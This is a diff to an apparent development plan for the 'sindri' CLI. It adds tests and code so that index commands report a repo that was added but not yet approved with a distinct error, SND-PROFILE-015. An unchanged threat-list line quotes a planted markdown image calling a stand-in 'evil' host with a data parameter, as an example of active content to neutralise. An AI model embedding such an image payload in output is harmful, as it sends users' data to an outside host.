@@ -63,7 +63,7 @@ Each is also edited into the spec in Task 11.
 6. **Active content in the rendered map** (a planted `![](https://evil/?d=x)`, an `<img>`, a link). It must be inert in the file. Pinned in Task 5.
 7. **A scope map written into a public repo.** Inside a git worktree, only `--sources file,code` is allowed. Pinned in Task 8.
 8. **A recall number that cannot be trusted** (an unstable adjudicator, a cited surface that doesn't exist, a bloated map). Two agreeing runs, surface validation, precision and a baseline guard it. Pinned in Task 9.
-9. **Onboarding that bypasses or blurs approval.** Look for a `repo onboard` that installs the hook or builds before the repo is in the approved profile, a rerun that isn't idempotent, or a busy heavy lock that makes it wait. The template hook must not block commits in a repo nobody onboarded, `init.templateDir` must not be overwritten, and `core.hooksPath` must never be set. Pinned in Task 10.
+9. **Onboarding that bypasses or blurs approval.** Look for a `repo onboard` that installs the hook or builds before the repo is in the approved profile, a rerun that isn't idempotent, or a busy heavy lock that makes it wait. The template hook must not block commits in a repo nobody onboarded, `init.templateDir` must not be overwritten, and `core.hooksPath` must never be set. Also: an index command whose `--repo` names a repo that is added but not approved must say exactly that (`SND-PROFILE-015`), never "no repo named". Pinned in Task 10.
 10. **A SessionStart nudge that slows, blocks or writes.** The risky cases are a slow or hung `sindri`, a session outside git, sindri not installed, a child `claude -p` session, and a linked worktree of an onboarded repo. Each must stay silent within the budget, never write the ledger, and print at most one line. Pinned in Task 10.
 
 ---
@@ -5069,6 +5069,121 @@ Expected: all PASS; coverage 100% on the files touched; `sync-rules` exits 0. Ru
 ```bash
 git add sindri/src sindri/tests docs/sindri/errors.md config/hooks scripts providers .agents/rules/hooks.md AGENTS.md
 git commit -m "feat: sindri repo onboard, repo status nudge and the opt-in git template hook"
+```
+
+The next steps fix a misleading error found in use. Running `sindri repo add <path> --name demo-app` and then `sindri index build --repo demo-app` without `profile approve` failed with `SND-PROFILE-004 no repo named demo-app`. The repo *is* in the live profile; it just isn't approved yet. Index commands read the approved snapshot, so they must say that.
+
+**Interfaces (Steps 6–10):**
+- Produces:
+  - `SND-PROFILE-015`: "`<name>` is in the live profile but not approved yet", with the fix `sindri profile approve` and exit code 1 (fixable). `SND-PROFILE-004` keeps its meaning: no such repo in either profile.
+  - `unapprovedRepos(deps, approved): string[]` in `index/commands.ts`: repos the live profile lists that the approved snapshot doesn't, sorted. It reads the live profile only (`resolveProfileRoot` and `loadProfile`), and an invalid or missing live profile gives `[]`.
+  - `reposOf(deps, loaded, only)`: a `--repo` naming a live-but-unapproved repo throws `SND-PROFILE-015`. This applies to every caller (`index build`, `index status`, `index query`). `index build` without `--repo` prints one more line when that list is non-empty: `skipped (in the live profile, not approved yet): <a>, <b>; run sindri profile approve`.
+
+- [ ] **Step 6: Write the failing test**
+
+Append to `sindri/tests/repo-onboard.test.ts`:
+
+```ts
+describe("index commands and a repo that was added but not approved", () => {
+  it("--repo names it as not approved yet (SND-PROFILE-015), not as missing; an unknown name is still SND-PROFILE-004", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    await runCli(["repo", "add", gitRepo({ "b.ts": "1" }), "--name", "demo-app"], d);
+    for (const args of [["index", "build", "--repo", "demo-app"], ["index", "status", "--repo", "demo-app"], ["index", "query", "x", "--repo", "demo-app"]]) {
+      const r = await runCli(args, d);
+      expect(r.exitCode).toBe(1);
+      expect(r.stderr).toContain("SND-PROFILE-015");
+      expect(r.stderr).toContain("demo-app is in the live profile but not approved yet");
+      expect(r.stderr).toContain("sindri profile approve");
+    }
+    expect((await runCli(["index", "build", "--repo", "no-such-repo"], d)).stderr).toContain("SND-PROFILE-004");
+  });
+
+  it("index build with no --repo builds the approved repos and lists the unapproved ones it skipped, in one line", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    await runCli(["repo", "add", gitRepo({ "b.ts": "1" }), "--name", "demo-app"], d);
+    await runCli(["repo", "add", gitRepo({ "c.ts": "1" }), "--name", "demo-lib"], d);
+    const r = await runCli(["index", "build"], d);
+    expect(r.exitCode).toBe(0);
+    const skipped = r.stdout.split("\n").filter((l) => l.startsWith("skipped (in the live profile, not approved yet)"));
+    expect(skipped).toEqual(["skipped (in the live profile, not approved yet): demo-app, demo-lib; run sindri profile approve"]);
+    expect(fs.existsSync(indexPath(d, "demo-app"))).toBe(false);
+    // After approval the line goes away and both are built.
+    await approve(d);
+    const after = await runCli(["index", "build"], d);
+    expect(after.stdout).not.toContain("not approved yet");
+    expect(fs.existsSync(indexPath(d, "demo-app"))).toBe(true);
+  });
+
+  it("an invalid live profile lists nothing as unapproved (the approved snapshot still runs)", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    fs.appendFileSync(path.join(d.env.AW_STATE_DIR as string, "profile", "profile.yaml"), "not: [valid\n");
+    const r = await runCli(["index", "build"], d);
+    expect(r.exitCode).toBe(0);
+    expect(r.stdout).not.toContain("not approved yet");
+  });
+});
+```
+
+- [ ] **Step 7: Run it to verify it fails**
+
+Run: `cd sindri && npx vitest run tests/repo-onboard.test.ts -t "not approved"`
+Expected: FAIL. The first test gets `SND-PROFILE-004` with exit 2, and the second finds no `skipped` line.
+
+- [ ] **Step 8: Implement**
+
+In `sindri/src/index/commands.ts` (import `loadProfile` and `resolveProfileRoot` from `../profile/load.js`):
+
+```ts
+// Repos the live profile lists that the approved snapshot doesn't: `repo add` without
+// `profile approve`. Read-only; a missing or invalid live profile lists nothing.
+export function unapprovedRepos(deps: Deps, approved: LoadedProfile): string[] {
+  const root = resolveProfileRoot(deps);
+  const live = root === null ? null : loadProfile(root);
+  return live !== null && live.ok ? Object.keys(live.value.repos).filter((n) => !Object.hasOwn(approved.repos, n)).sort() : [];
+}
+
+function reposOf(deps: Deps, loaded: LoadedProfile, only: string | undefined): string[] {
+  if (only === undefined) return Object.keys(loaded.repos).sort();
+  if (!(only in loaded.repos)) {
+    if (unapprovedRepos(deps, loaded).includes(only)) {
+      throw new SindriError("SND-PROFILE-015", `${only} is in the live profile but not approved yet`, {
+        fix: "sindri profile approve (review the diff), then at a terminal: sindri profile approve <hash>; or sindri repo onboard, which prints both",
+        exitCode: 1,
+      });
+    }
+    throw new SindriError("SND-PROFILE-004", `no repo named ${only}`);
+  }
+  return [only];
+}
+```
+
+Pass `deps` at the three call sites (`build`, `status`, `query`). In `build`, after the loop:
+
+```ts
+  const pending = values.repo === undefined ? unapprovedRepos(deps, loaded) : [];
+  if (pending.length > 0) lines.push(`skipped (in the live profile, not approved yet): ${pending.join(", ")}; run sindri profile approve`);
+```
+
+`buildIndex`'s own `SND-PROFILE-004` check stays. Its callers resolve names through `reposOf` or (in `onboard`) through the approval check first.
+
+Add to `ERRORS`:
+
+```ts
+  "SND-PROFILE-015": { summary: "That repo is in the live profile but not approved yet.", fix: "run `sindri profile approve`, review the diff, then approve it at a terminal (or `sindri repo onboard`, which prints both commands)" },
+```
+
+In `docs/sindri/index.md`, add a troubleshooting row: `` | `SND-PROFILE-015 <name> is in the live profile but not approved yet` | `repo add` ran, `profile approve` didn't | `sindri profile approve`, then rerun | ``.
+
+- [ ] **Step 9: Run the tests**
+
+Run: `cd sindri && npm run gen && npm run typecheck && npm run test:coverage`
+Expected: all PASS, including the Plan 3 `index-build`, `index-profile` and `repo-add` tests, unchanged; coverage 100% on the files touched.
+
+- [ ] **Step 10: Commit**
+
+```bash
+git add sindri/src sindri/tests docs/sindri
+git commit -m "fix: sindri index commands name a repo that is added but not approved (SND-PROFILE-015)"
 ```
 
 ---
